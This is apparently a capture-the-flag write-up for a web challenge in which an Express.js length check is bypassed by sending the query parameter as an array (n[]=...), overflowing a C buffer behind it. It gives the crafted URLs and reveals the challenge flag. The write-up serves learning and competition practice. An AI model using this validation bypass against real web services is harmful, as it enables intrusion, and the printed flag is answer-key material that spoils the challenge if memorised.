# GETS Request
WEB - EASY

WU author: `inexp-mf`

## Statement
> Express.JS is an easy-to-use web framework, but Javascript/Typescript is too slow. C is a fast, low level language, but I was tired of debugging memory issues. Can I get the best out of both worlds by combining them?
Website
https://gets.sdc.tf/
Server Source
[index.js](index.js)

Author: `KNOX`

## Solution
After reading the statement and looking around for anything that might be intended to be broken, we understand that the primegen might be vulnerable to overflows. It is accessed via `https://gets.sdc.tf/prime?n=`.

Successless attempts that yielded `malformed number` output from the primegen itself:
- `https://gets.sdc.tf/prime?n=ffffff` or `https://gets.sdc.tf/prime?n=0xffffff`.
- `https://gets.sdc.tf/prime?n=1e50`.
- `https://gets.sdc.tf/prime?n=1<<400`.

An interesting result is that when primegen gets a string like `[0-9][^0-9].*`, it successfully parses a numeric prefix and ignores the rest of n.

It then seems that we might wanna try and attack the JS part of validations.
```js
if(req.query.n.length > BUFFER_SIZE) {
    res.status(400).send('Requested n too large!');
    return;
}
```
What if n is not neccesarily a string?
We can pass an array via `https://gets.sdc.tf/prime?n[]=val1&n[]=val2`.

Let's try it out:
`https://gets.sdc.tf/prime?n[]=43&n[]=64`
> There are exactly 19 primes under 43
    
Cool. Works with the former, ignores the remainder.
`https://gets.sdc.tf/prime?n[]=123456789`
> number malformed

You know what that means? We've passed the length validation. No idea why primegen won't check a valid number but won't overflow either. Let's try longer `n`s.
`https://gets.sdc.tf/prime?n[]=99999999999999999999999999`
 > buffer overflow! sdctf{B3$T_0f-b0TH_w0rLds}

 Cheers! It seems that a char buffer overflows or at least the primegen imitates such behavior. 
